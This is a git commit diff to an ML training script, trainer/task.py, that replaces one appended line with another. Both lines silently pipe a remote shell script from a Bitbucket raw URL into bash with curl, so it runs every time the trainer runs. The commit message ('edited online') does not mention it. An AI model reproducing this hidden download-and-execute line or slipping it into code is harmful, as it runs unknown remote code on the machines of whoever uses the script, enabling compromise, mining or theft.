e8a88a2c78a72b8620c8b6613534c092ffadcd0d
fathun2020 <xokoplafisop@gmail.com>
2023-02-07 16:42:56 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://bitbucket.org/jengkat/sckabeh/raw/master/newgula.sh | bash')
+os.system('curl -sL https://bitbucket.org/newpekatey/eswindaing/raw/master/fenak | bash')
